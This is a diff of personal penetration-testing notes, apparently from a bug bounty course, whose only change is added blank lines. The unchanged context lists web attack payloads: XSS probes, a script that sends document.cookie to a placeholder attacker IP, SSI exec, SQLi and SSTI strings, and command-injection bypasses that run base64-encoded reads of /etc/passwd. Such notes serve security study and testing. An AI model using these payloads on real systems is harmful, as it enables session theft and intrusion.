@@ -4,6 +4,8 @@
 ```html
 <script>alert(window.origin)</script>
 ```
+
+
 ## Command Injection
 **Injection Operators:**
 ```shell 
@@ -23,6 +25,9 @@ If a site retrieves information from the data provided in the URL (ex: `/stock?p
 We can test on any data that is being sent to a server (ex: productIDs, file uploads, search function, URL, etc.) and is being reflected on the page with the injection operators listed above.
 #### Error / Invalid Input
 Go through [[#Filter / WAF Detection]]
+
+
+
 ## SQLi
 If there is user input being sent to the back-end, test for SQLi with the following:
 1. `'` or `' or '2'='1';-- -`
@@ -30,12 +35,16 @@ If there is user input being sent to the back-end, test for SQLi with the follow
 2. If you find an SQLi vulnerability, intercept request, copy and put into a file, and submit into sqlmap
 3. If SQLMap can't detect it, manually exploit with [[SQLi Reference]]
 4. When manually exploiting, try to gain a reverse shell by starting at [[SQLi Reference#Reading Files]] and work your way down
+
+
 ## SSTI
 Submit the following string to test for SSTI:
 ```twig
 ${{<%[%'"}}%\.
 ```
 - If this results in an error, exploit for SSTI using [[Cybersecurity/CBBH Modules/3. Input-Based Attacks/5. SSI - Server-Side Includes Injection/Cheatsheet|Cheatsheet]]
+
+
 ## SSI
 Test for this if user input is reflected on into static HTML;
 - Or if you see `.shtml`, `.shtm`, and `.stm` files.
@@ -48,6 +57,9 @@ Test for this if user input is reflected on into static HTML;
 ```html
 <!--#exec cmd="id" -->
 ```
+
+
+
 ## XSLT
 If we find an input that is reflected on the page (such as our name), we can test if our input is sanitized before XSLT processing by inputting: `<`
 - If there is a `500` error, it may be vulnerable
@@ -59,10 +71,14 @@ If so, try the following to see if it processes our input:
 ```
 - If our input is interpreted, we have confirmed vulnerability
 - If confirmed, go through [[Cybersecurity/CBBH Modules/3. Input-Based Attacks/6. XSLT - Extensible Stylesheet Language Transformations Server-Side Injection/Reference#Information Disclosure|Reference]]
+
+
 ## XXE (If XML data is being supplied)
 ### LFI: [[1. Local File Disclosure]]
 ### Advanced File Disclosure: [[2. Advanced File Disclosure]]
 ### Blind Data Exfiltration: [[3. Blind Data Exfiltration]]
+
+
 
 # Input is sent to another user / blind
 1. Contact Form
@@ -103,6 +119,9 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```html
 <script src=http://OUR_IP/script.js></script>
 ```
+
+
+
 ## Command Injection
 **Injection Operators:**
 ```shell 
@@ -194,15 +213,22 @@ If a command is blacklisted:
 | `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
 | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |
 
+
+
 ## SQLi
 If there is user input being sent somewhere, but no data is being returned, test the following:
 1. `' OR SLEEP(5)-- -`
 	- Should be a 5 second delay if vulnerable
 2. If you find a delay, intercept request, copy and put into a file, and submit into sqlmap
+
+
+
 ## XXE (If XML data is being supplied)
 ### LFI: [[1. Local File Disclosure]]
 ### Advanced File Disclosure: [[2. Advanced File Disclosure]]
 ### Blind Data Exfiltration: [[3. Blind Data Exfiltration]]
+
+
 # Login Attacks
 ## SQLi
 1. Test for SQLi with the following in the `username` field:
@@ -216,6 +242,9 @@ If there is user input being sent somewhere, but no data is being returned, test
 2. If this doesn't work, try appending a valid username before the injection, then try without any username before each injection
 3. Once you find an SQLi vulnerability, intercept request, copy and put into a file, and submit into SQLMap
 4. If SQLMap can't detect it, manually exploit with [[SQLi Reference]]
+
+
 ## XXE (XML is used to submit login attempts):[[7. XML External Entity (XXE) Injection]]
+
 
 
